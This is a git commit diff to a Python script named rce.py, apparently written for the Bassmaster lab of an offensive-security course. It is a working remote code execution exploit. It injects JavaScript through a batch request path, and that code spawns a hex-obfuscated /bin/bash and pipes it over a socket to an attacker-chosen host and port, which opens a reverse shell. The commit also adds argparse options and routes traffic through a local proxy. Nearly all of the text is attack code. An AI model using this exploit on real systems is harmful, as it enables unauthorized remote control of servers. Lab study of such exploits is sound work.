5931278030cd9052f589dde7b32d417d2e189e45
Matheus Alexandre <60984217+Xcatolin@users.noreply.github.com>
2023-04-20 19:18:31 -0300

    Update rce.py

--- Bassmaster/rce.py
+++ Bassmaster/rce.py
@@ -1,28 +1,41 @@
-import sys, requests
+import sys, requests, argparse
+
+s = requests.Session()
+proxies = {
+  "http": "http://127.0.0.1:8080",
+  "https": "https://127.0.0.1:8080",
+}
 
 def delivery(ip, lhost, lport):
 	target = "http://%s/batch" % ip
-	s = requests.Session()
-
 	cmd = "\\\\x2fbin\\\\x2fbash"
 	payload = "var net = require(\'net\'),sh = require(\'child_process\').exec(\'%s\');" % cmd
 	payload += "var client = new net.Socket();"
 	payload += "client.connect(%s, \'%s\', function() {client.pipe(sh.stdin);sh.stdout.pipe(client);" % (lport, lhost)
 	payload += "sh.stderr.pipe(client);});"
-
 	req = '{"requests":[{"method":"get","path":"/profile"},{"method":"get","path":"/item"},{"method":"get","path":"/item/$1.id;%s"}]}' % payload
-
-	s.post(target, req)
+	req = s.post(target, req, proxies=proxies)
+	res = req.text
+	if req.status_code == 200:
+		print("\n[+] Payload delivered.")
+		print(res)
+	else:
+		print("\n[!] Unexpected error.")
 
 def main():
-	if len(sys.argv) != 3:
-		print("[!] Usage: python3 %s <target:port/app_path> <lhost> <lport>" % sys.argv[0])
-		print("ex: python3 %s 192.168.1.100:8080/bassmaster 192.168.0.1 4444\n" % sys.argv[0])
+	parser = argparse.ArgumentParser()
+	parser.add_argument('--ip', help='Target IP address', required=True)
+	parser.add_argument('--lhost', help='Local listener IP address', required=True)
+	parser.add_argument('--lport', help='Local listener port', required=True)
+	if len(sys.argv)<=1:
+		print("[!] Usage: python3 %s --ip 192.168.0.5:80/app --lhost 192.168.0.1 --lport 8080" % sys.argv[0])
+		parser.print_help()
 		sys.exit(-1)
+	args = parser.parse_args()
+	ip = args.ip
+	lhost = args.lhost
+	lport = args.lport
 
-	ip = sys.argv[1]
-  lhost = sys.argv[2]
-	lport = sys.argv[3]
 	delivery(ip, lhost, lport)
 
 if __name__ == "__main__":
